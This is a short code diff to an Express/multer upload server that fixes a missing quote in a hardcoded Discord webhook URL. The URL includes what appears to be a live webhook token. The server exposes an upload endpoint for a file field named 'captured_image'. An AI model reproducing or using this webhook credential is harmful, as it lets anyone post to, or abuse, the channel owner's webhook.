@@ -22,7 +22,7 @@ const storage = multer.diskStorage({
 
 const upload = multer({ storage: storage });
 
-const DISCORD_WEBHOOK_URL = https://discord.com/api/webhooks/1525474576606429217/oWCYqOBzZ1srvTFOwFDoz4TEMNLNT0THY9X4jmVm1zCFELE90qOkxGST6-QQ1iN6DcHR';
+const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1525474576606429217/oWCYqOBzZ1srvTFOwFDoz4TEMNLNT0THY9X4jmVm1zCFELE90qOkxGST6-QQ1iN6DcHR';
 
 app.post('/api/upload', upload.single('captured_image'), async (req, res) => {
     if (!req.file) return res.status(400).json({ error: 'لا يوجد ملف' });
